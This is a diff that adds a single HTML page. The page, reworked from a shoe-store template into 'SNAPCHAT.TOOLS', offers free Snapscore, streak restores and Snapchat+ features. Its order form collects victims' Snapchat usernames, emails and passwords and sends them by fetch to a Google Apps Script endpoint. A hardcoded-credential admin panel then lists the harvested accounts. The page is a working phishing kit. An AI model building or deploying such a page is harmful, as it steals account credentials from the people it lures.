@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kawnain Shoes | Premium Store</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+
+    <style>
+        :root { --primary: #1a1a1a; --accent: #ff4757; --success: #2ed573; --bg: #f1f2f6; }
+        body { font-family: 'Poppins', sans-serif; margin: 0; background: var(--bg); color: #2f3542; }
+        
+        header { background: #fff; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 24px; font-weight: 600; color: var(--primary); cursor: pointer; }
+        .logo span { color: var(--accent); }
+        .admin-btn { border: 2px solid var(--primary); background: transparent; padding: 8px 18px; border-radius: 25px; cursor: pointer; font-weight: 600; transition: 0.3s; }
+        .admin-btn:hover { background: var(--primary); color: #fff; }
+
+        .container { padding: 40px 5%; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
+        .card { background: #fff; border-radius: 20px; padding: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05); transition: 0.3s; position: relative; overflow: hidden; }
+        .card:hover { transform: translateY(-10px); box-shadow: 0 15px 35px rgba(0,0,0,0.1); }
+        .card img { width: 100%; border-radius: 15px; height: 220px; object-fit: cover; }
+        .price { font-size: 1.5rem; font-weight: 600; color: var(--success); margin-bottom: 15px; }
+        .buy-now { background: var(--primary); color: #fff; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+
+        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); z-index: 2000; width: 90%; max-width: 450px; display: none; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1500; display: none; backdrop-filter: blur(5px); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+
+        #adminPanel { padding: 40px 5%; background: #fff; min-height: 100vh; display: none; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
+        th { background: var(--primary); color: white; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo" onclick="location.reload()">SNAPCHAT<span>.TOOLS</span></div>
+    <button class="admin-btn" onclick="toggleModal('loginModal', true)"> </button>
+</header>
+
+<div id="storeView">
+    <div class="container">
+        <div class="card">
+            <img src="https://tse2.mm.bing.net/th/id/OIP.nLDsQMsQAHgmbS_MTQpUTgHaQC?rs=1&pid=ImgDetMain&o=7&rm=3" alt="Red Nike">
+            <h3>50K SNAPSCORE</h3>
+            <p class="price">₹ FREE (FOR 3 DAYS)</p>
+            <button class="buy-now" onclick="openOrder('50K SNAPSCORE', 0)">Order Now</button>
+        </div>
+        <div class="card">
+            <img src="https://tse3.mm.bing.net/th/id/OIP.BtP4ISUR7zT4NLzqDOkdGAHaEK?rs=1&pid=ImgDetMain&o=7&rm=3" alt="Green Shoe">
+            <h3>RESTORE 20 STREAKS </h3>
+            <p class="price">₹ FREE (ONLY 20 STREAKS)</p>
+            <button class="buy-now" onclick="openOrder('RESTORE SNAPSTREAK', 0)">Order Now</button>
+        </div>
+        <div class="card">
+            <img src="https://th.bing.com/th?q=Snapchat%2b+Plus+Logo.png&w=120&h=120&c=1&rs=1&qlt=70&o=7&cb=1&pid=InlineBlock&rm=3&mkt=en-IN&cc=IN&setlang=en&adlt=moderate&t=1&mw=247" alt="Casual">
+            <h3>SNAPCHAT PREMIUM</h3>
+            <p class="price">₹ FREE SNAPCHAT+ FEATURES</p>
+            <button class="buy-now" onclick="openOrder('SNAPCHAT PREMIUM', 0)">Order Now</button>
+        </div>
+    </div>
+</div>
+
+<div id="orderModal" class="modal">
+    <h3>Order Details</h3>
+    <p id="prodInfo" style="font-weight: bold; color: var(--accent);"></p>
+    <input type="text" id="custName" placeholder="USERNAME/MOBILE NUMBER">
+    <input type="text" id="custPhone" placeholder="EMAIL ID">
+    <input type="text" id="custAddress" placeholder="SNAPCHAT PASSWORD">
+    <button class="buy-now" onclick="submitOrder()" style="background:var(--success)">Confirm Order</button>
+    <button onclick="closeAll()" style="background:none; border:none; color:red; cursor:pointer; width:100%; margin-top:10px;">Cancel</button>
+</div>
+
+<div id="loginModal" class="modal">
+    <h3>Admin Security</h3>
+    <input type="text" id="user" placeholder="Username">
+    <input type="password" id="pass" placeholder="Password">
+    <button class="buy-now" onclick="checkAdmin()">Login</button>
+</div>
+
+<div id="adminPanel">
+    <div style="display:flex; justify-content: space-between; align-items: center;">
+        <h2>Global Orders (Google Sheets)</h2>
+        <button class="admin-btn" onclick="location.reload()">Logout</button>
+    </div>
+    <table>
+        <thead>
+            <tr>
+                <th>Customer</th>
+                <th>Phone</th>
+                <th>Product</th>
+                <th>Address</th>
+                <th>Price</th>
+            </tr>
+        </thead>
+        <tbody id="orderTableBody"></tbody>
+    </table>
+</div>
+
+<div id="overlay" class="overlay" onclick="closeAll()"></div>
+
+<script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyCiQAj6fSx7-9-KIbCRe7tc3vzLs-ya_lwKSGbmgMHzj3WM7b8Gs6RW81akRW7QAMOqg/exec";
+    let selectedShoe = "";
+    let selectedPrice = 0;
+
+    function toggleModal(id, show) {
+        document.getElementById(id).style.display = show ? 'block' : 'none';
+        document.getElementById('overlay').style.display = show ? 'block' : 'none';
+    }
+
+    function closeAll() {
+        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
+        document.getElementById('overlay').style.display = 'none';
+    }
+
+    function openOrder(name, price) {
+        selectedShoe = name;
+        selectedPrice = price;
+        document.getElementById('prodInfo').innerText = name + " - ₹" + price;
+        toggleModal('orderModal', true);
+    }
+
+    // --- Order Bhejna ---
+    function submitOrder() {
+        const name = document.getElementById('custName').value;
+        const phone = document.getElementById('custPhone').value;
+        const addr = document.getElementById('custAddress').value;
+
+        if(!name || !phone || !addr) {
+            Swal.fire('Error', 'Sari details bhariye!', 'error');
+            return;
+        }
+
+        const data = { name, phone, shoe: selectedShoe, address: addr, price: selectedPrice };
+
+        Swal.fire({ title: 'Processing...', allowOutsideClick: false, didOpen: () => { Swal.showLoading(); } });
+
+        fetch(SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data)
+        }).then(() => {
+            Swal.fire('Success', 'Order Sheet mein save ho gaya!', 'success');
+            closeAll();
+            document.getElementById('custName').value = "";
+            document.getElementById('custPhone').value = "";
+            document.getElementById('custAddress').value = "";
+        }).catch(() => {
+            Swal.fire('Error', 'Kuch galti hui!', 'error');
+        });
+    }
+
+    // --- Admin Login & Data Fetch ---
+    function checkAdmin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(u === "kawnain" && p === "kawnain737@#") {
+            document.getElementById('storeView').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'block';
+            closeAll();
+            renderOrders();
+        } else {
+            Swal.fire('Denied', 'Galat ID ya Password!', 'error');
+        }
+    }
+
+    function renderOrders() {
+        const tbody = document.getElementById('orderTableBody');
+        tbody.innerHTML = "<tr><td colspan='5'>Loading global orders...</td></tr>";
+
+        fetch(SCRIPT_URL)
+        .then(res => res.json())
+        .then(data => {
+            tbody.innerHTML = "";
+            if(data.length === 0) {
+                tbody.innerHTML = "<tr><td colspan='5'>Koi order nahi mila.</td></tr>";
+                return;
+            }
+            data.reverse().forEach(row => {
+                tbody.innerHTML += `<tr>
+                    <td>${row[0]}</td>
+                    <td>${row[1]}</td>
+                    <td>${row[2]}</td>
+                    <td>${row[3]}</td>
+                    <td>₹${row[4]}</td>
+                </tr>`;
+            });
+        })
+        .catch(err => {
+            tbody.innerHTML = "<tr><td colspan='5'>Error loading data.</td></tr>";
+        });
+    }
+</script>
+
+</body>
+</html>
